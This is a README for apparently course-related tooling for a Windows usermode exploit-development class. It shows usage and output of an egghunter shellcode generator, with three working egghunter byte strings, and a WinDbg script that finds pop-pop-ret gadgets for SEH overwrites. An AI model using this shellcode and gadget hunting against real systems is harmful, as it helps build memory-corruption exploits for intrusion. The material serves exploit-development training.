# osed-scripts
bespoke tooling for offensive security's Windows Usermode Exploit Dev course (OSED)

## Standalone Scripts

### egghunter.py

requires [keystone-engine](https://github.com/keystone-engine/keystone)

 

```
usage: egghunter.py [-h] [-t TAG] [-b BAD_CHARS [BAD_CHARS ...]] [-s]

Creates an egghunter compatible with the OSED lab VM

optional arguments:
  -h, --help            show this help message and exit
  -t TAG, --tag TAG     tag for which the egghunter will search (default: c0d3)
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to check for in final egghunter (default: 00)
  -s, --seh             create an seh based egghunter instead of NtAccessCheckAndAuditAlarm

```                        

generate default egghunter
```
./egghunter.py 
[+] egghunter created!
[=]   len: 35 bytes
[=]   tag: c0d3c0d3
[=]   ver: NtAccessCheckAndAuditAlarm

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

```

generate egghunter with `w00tw00t` tag
```
./egghunter.py --tag w00t
[+] egghunter created!
[=]   len: 35 bytes
[=]   tag: w00tw00t
[=]   ver: NtAccessCheckAndAuditAlarm

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

```

generate SEH-based egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
```
./egghunter.py -b 00 0a 25 26 3d --seh
[+] egghunter created!
[=]   len: 69 bytes
[=]   tag: c0d3c0d3
[=]   ver: SEH

egghunter = b"\xeb\x2a\x59\xb8\x63\x30\x64\x33\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"

```

## WinDbg Scripts

all windbg scripts require `pykd`

run `.load pykd` then `!py c:\path\to\this\repo\script.py` 

### find-ppr.py

Search for `pop r32; pop r32; ret` instructions by module name

```
!py find-ppr.py libspp diskpls

[+] diskpls::0x004313ad: pop ecx; pop ecx; ret
[+] diskpls::0x004313e3: pop ecx; pop ecx; ret
[+] diskpls::0x00417af6: pop ebx; pop ecx; ret
...
[+] libspp::0x1008a538: pop ebx; pop ecx; ret
[+] libspp::0x1008ae39: pop ebx; pop ecx; ret
[+] libspp::0x1008aebf: pop ebx; pop ecx; ret
...
```
